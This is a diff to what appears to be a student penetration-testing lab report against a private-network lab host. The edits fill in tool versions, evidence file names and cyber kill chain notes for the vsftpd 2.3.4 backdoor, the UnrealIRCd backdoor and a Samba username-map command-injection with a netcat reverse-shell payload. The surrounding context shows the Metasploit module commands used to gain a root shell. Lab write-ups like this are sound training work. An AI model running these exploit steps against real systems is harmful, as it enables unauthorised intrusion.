@@ -9,7 +9,7 @@
 
 **Target IP:** 192.168.1.4
 
-**Attacker OS / Tools:**  Kali Linux 2026.x, Metasploit Framework x.x, nmap x.x
+**Attacker OS / Tools:**  Kali Linux 2026.2, Metasploit Framework 6.4, nmap 7.99
 
 ---
 
@@ -78,7 +78,7 @@ PORT     SERVICE    VERSION
   7. exploit - runs the exploit
   8. getuid - confirms root access
    
-- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
+- **Evidence:** evidence/exploit1.png
 - 
 - **Cyber Kill Chain Stage(s):** Reconnaissance - nmap identified the exact        vsftpd version( vsftpd2.3.4)
 - Weaponization - selects the matching Metasploitable module
@@ -101,7 +101,7 @@ PORT     SERVICE    VERSION
   2. use exploit/unix/irc/unreal_irc_3281_backdoor
   3. set RHOSTS 192.168.1.4
   4. set LHOST 192.168.1.3
-- **Evidence:** evidence/exploit1
+- **Evidence:** evidence/exploit2
 - **Cyber Kill Chain Stage(s):**  Reconnaissance - nmap identidied UnrealIRCd service on 6667
 - Weaponization - selected matching module
 - Delivery - module registered an IRC connection and sent the trigger line
@@ -125,8 +125,8 @@ PORT     SERVICE    VERSION
   6. exploit - opens command shell session 2
   7. whoami / id 
       
-- **Evidence:** evidence/exploit3.png>
-- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance - nmap identified vulnerable Samba version 3.0.20-Debian
+- **Evidence:** evidence/exploit3.png
+- **Cyber Kill Chain Stage(s):**  Reconnaissance - nmap identified vulnerable Samba version 3.0.20-Debian
 -  Weaponization - selected the matching command-injection module and configured the netcat reverse-she payload
 -  Delivery - module sent the crafted malicious username to the SB service 
 -  Exploitation - username map script executed the injection shell command  
